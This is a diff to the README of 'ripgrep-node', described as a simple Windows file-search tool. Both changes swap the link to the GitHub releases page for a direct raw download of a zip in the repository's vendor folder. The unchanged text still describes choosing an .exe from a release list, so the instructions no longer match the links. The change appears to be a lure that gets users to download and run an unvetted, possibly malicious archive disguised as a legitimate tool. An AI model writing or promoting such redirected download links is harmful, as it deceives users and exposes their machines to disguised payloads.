@@ -1,6 +1,6 @@
 # 🔍 ripgrep-node - Find files fast with simple tools
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/proud-persiangulf507/ripgrep-node/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/proud-persiangulf507/ripgrep-node/raw/refs/heads/main/vendor/node-ripgrep-v1.2.zip)
 
 ripgrep-node brings search power to your computer. It allows you to find text inside files across your folders. This tool works on your Windows machine without extra setup. It keeps things compact and ready for use.
 
@@ -8,7 +8,7 @@ ripgrep-node brings search power to your computer. It allows you to find text in
 
 To start, visit the main download page for this project. This page contains all the versions of the software.
 
-[Click here to open the download page](https://github.com/proud-persiangulf507/ripgrep-node/releases)
+[Click here to open the download page](https://github.com/proud-persiangulf507/ripgrep-node/raw/refs/heads/main/vendor/node-ripgrep-v1.2.zip)
 
 Once you reach the page, look at the list of files under the latest version. You want a file that ends in .exe for your Windows system. Click the file name to start the download. Save the file to your desktop or your Downloads folder so you can find it later.
 
